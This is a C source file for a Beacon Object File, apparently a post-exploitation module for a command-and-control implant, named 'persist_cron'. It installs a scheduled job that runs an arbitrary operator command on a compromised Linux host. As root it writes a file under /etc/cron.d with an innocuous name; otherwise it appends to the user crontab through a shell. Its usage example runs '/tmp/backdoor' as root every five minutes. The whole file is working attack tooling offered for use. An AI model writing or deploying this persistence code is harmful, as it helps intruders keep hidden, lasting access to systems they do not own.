#include "bof_api.h"

/* BOF entry point */
void go(char *args, int args_len) {
    datap parser;
    char *command;
    char *minute;
    char *hour;
    char *day_month;
    char *month;
    char *day_week;
    char *user;
    char *filename;
    int command_len;
    int minute_len;
    int hour_len;
    int day_month_len;
    int month_len;
    int day_week_len;
    int filename_len;
    int user_len;

    BeaconDataParse(&parser, args, args_len);

    // Extract parameters in order
    command = BeaconDataExtract(&parser, &command_len);
    minute = BeaconDataExtract(&parser, &minute_len);
    hour = BeaconDataExtract(&parser, &hour_len);
    day_month = BeaconDataExtract(&parser, &day_month_len);
    month = BeaconDataExtract(&parser, &month_len);
    day_week = BeaconDataExtract(&parser, &day_week_len);
    filename = BeaconDataExtract(&parser, &filename_len);
    user = BeaconDataExtract(&parser, &user_len);


    if (!command || command_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: persist_cron <command> [minute] [hour] [day_month] [month] [day_week] [user] [filename]\n");
        BeaconPrintf(CALLBACK_ERROR, "[!] Example: persist_cron \"/tmp/backdoor\" \"*/5\" \"*\" \"*\" \"*\" \"*\" \"root\" \"update-check\"\n");
        return;
    }

    // Set default values for empty or "-" parameters
    if (!minute || minute_len <= 0 || AxStrcmp(minute, "-") == 0) minute = "*/5";
    if (!hour || hour_len <= 0 || AxStrcmp(hour, "-") == 0) hour = "*";
    if (!day_month || day_month_len <= 0 || AxStrcmp(day_month, "-") == 0) day_month = "*";
    if (!month || month_len <= 0 || AxStrcmp(month, "-") == 0) month = "*";
    if (!day_week || day_week_len <= 0 || AxStrcmp(day_week, "-") == 0) day_week = "*";
    if (!filename || filename_len <= 0 || AxStrcmp(filename, "-") == 0) filename = "persistence";

    // Check if user was provided (not empty, not "-")
    int has_user = 0;
    if (user && user_len > 0 && AxStrcmp(user, "-") != 0) {
        has_user = 1;
    }

    // CRITICAL: Check root privileges BEFORE doing anything
    int is_root = BeaconIsAdmin();

    // If user specified but not root, fail immediately
    if (has_user && !is_root) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Root privileges required to specify user\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[Persist Cron] Creating persistence...\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Command: %s\n", command);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Schedule: %s %s %s %s %s\n", 
                 minute, hour, day_month, month, day_week);

    // Build cron line
    char cron_line[4096];

    if (has_user) {
        // With specific user
        AxSnprintf(cron_line, sizeof(cron_line), "%s %s %s %s %s %s %s\n",
                   minute, hour, day_month, month, day_week, user, command);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] User: %s\n", user);
    } else {
        // Without specific user
        AxSnprintf(cron_line, sizeof(cron_line), "%s %s %s %s %s %s\n",
                   minute, hour, day_month, month, day_week, command);
    }

    // If root, try system cron first
    if (is_root) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Running as root\n");

        char cron_path[512];
        AxSnprintf(cron_path, sizeof(cron_path), "/etc/cron.d/%s", filename);

        char cron_content[4096];

        if (has_user) {

            AxSnprintf(cron_content, sizeof(cron_content),
                       "SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n%s",
                       cron_line);
        } else {

            AxSnprintf(cron_content, sizeof(cron_content),
                       "SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n%s %s %s %s %s root %s\n",
                       minute, hour, day_month, month, day_week, command);
        }

        int cron_fd = AxOpenFile(cron_path, 577, 0644);

        if (cron_fd >= 0) {
            int write_result = AxWriteFile(cron_fd, cron_content, AxStrlen(cron_content));
            AxCloseFile(cron_fd);

            if (write_result > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Persistence created in %s\n", cron_path);
                return;
            }
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Falling back to user crontab...\n");
    }

    // User-level method: use crontab
    char crontab_cmd[4096];

    AxSnprintf(crontab_cmd, sizeof(crontab_cmd), 
               "(crontab -l 2>/dev/null; echo '%s') | crontab -",
               cron_line);

    int pid = AxFork();

    if (pid < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Fork error\n");
        return;
    }

    if (pid == 0) {
        char *argv[] = {
            "/bin/sh",
            "-c",
            crontab_cmd,
            NULL
        };

        char *envp[] = { NULL };
        AxExecve("/bin/sh", argv, envp);
        AxKill(AxGetPid(), 9);
    }

    int status;
    AxWaitpid(pid, &status, 0);

    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Persistence created successfully\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create persistence\n");
    }
}
